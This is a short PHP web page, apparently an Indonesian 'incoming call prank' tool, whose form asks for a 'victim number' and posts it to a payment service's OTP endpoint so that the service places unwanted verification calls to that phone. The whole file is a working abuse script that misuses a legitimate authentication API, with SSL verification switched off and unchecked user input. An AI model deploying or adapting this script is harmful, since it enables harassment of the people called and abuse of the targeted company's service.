<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title>Prank Panggilan Masuk (V.1) by Pe Jung Labs - Lalu Zulfakar Hidayat</title>
</head>
<body>
<?php
    function send($phone)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");
        $asw = curl_exec($ch);
        curl_close($ch);
    }
    
    $execute = send($_POST['nomor']);
?>
<h1>Prank Panggilan Masuk (V.1) by <a href="https://laluzulfakar.com/">Pe Jung Labs</a></h1>
<center>
	<iframe data-aa="1144841" src="//acceptable.a-ads.com/1144841" scrolling="no" style="border:0px; padding:0; width: 100%; height: 100%; overflow:hidden" allowtransparency="true"></iframe>
	<form action="" method="POST">
		<table align="center">
			<tr>
				<th>Masukan Nomor Korban:</th>
				<th></th>
			</tr>
			<tr>
				<td><input type="text" name="nomor"></td>
				<td>
					<button type="submit">Gaskeun Mang</button>
				</td>
			</tr>
		</table>
	</form>
	<iframe data-aa="1144841" src="//acceptable.a-ads.com/1144841" scrolling="no" style="border:0px; padding:0; width: 100%; height: 100%; overflow:hidden" allowtransparency="true"></iframe>
</center>
</body>
</html>
